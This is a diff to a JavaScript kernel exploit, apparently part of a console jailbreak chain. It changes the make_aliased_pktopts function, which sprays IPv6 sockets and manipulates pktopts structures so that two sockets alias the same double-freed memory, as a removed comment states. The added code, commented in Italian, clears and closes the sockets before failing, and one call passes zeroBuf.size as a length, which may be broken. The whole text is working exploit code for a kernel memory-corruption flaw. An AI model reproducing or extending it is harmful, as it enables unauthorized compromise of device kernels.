@@ -977,14 +977,11 @@ function make_aliased_pktopts(sds) {
                 log(`found pair: ${pair}`);
                 sds.splice(marker, 1);
                 sds.splice(i, 1);
-                // add pktopts to the new sockets now while new allocs can't
-                // use the double freed memory
                 for (let i = 0; i < 2; i++) {
                     const sd = new_socket();
                     ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
                     sds.push(sd);
                 }
-
                 return pair;
             }
         }
@@ -993,6 +990,30 @@ function make_aliased_pktopts(sds) {
             setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
     }
+
+    try {
+        const zeroBuf = new Buffer(0x100);
+        for (const sd of sds) {
+            try {
+                // 1) libera la struttura pktopts
+                setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                // 2) azzera ipv6_pktinfo
+                setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
+                // 3) azzera ipv6_rthdr
+                setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
+            } catch (e) {
+                // Se fallisce, proseguiamo comunque
+            }
+            try {
+                close(sd);
+            } catch (e) {
+                // Se chiudere fallisce, lo ignoriamo
+            }
+        }
+    } catch (cleanupErr) {
+        log(`Errore durante cleanup in make_aliased_pktopts: ${cleanupErr}`);
+    }
+
     die('failed to make aliased pktopts');
 }
 
